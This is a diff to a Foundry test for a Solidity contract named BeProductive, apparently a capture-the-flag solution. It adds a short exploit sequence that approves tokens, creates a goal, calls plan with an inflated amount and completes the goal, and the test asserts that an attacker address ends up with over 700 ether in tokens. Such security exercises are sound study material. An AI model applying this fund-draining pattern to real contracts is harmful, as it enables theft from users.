@@ -30,7 +30,10 @@ contract BeProductiveTest is Test {
         address hacker = address(0xBAD);
         
         vm.startPrank(hacker);
-        
+        token.approve(address(target), 10 ether);
+        target.createGoal(10 ether, 100 ether);
+        target.plan(590 ether);
+        target.completeGoal();
         vm.stopPrank();
 
         assertGt(token.balanceOf(hacker), 700 ether);
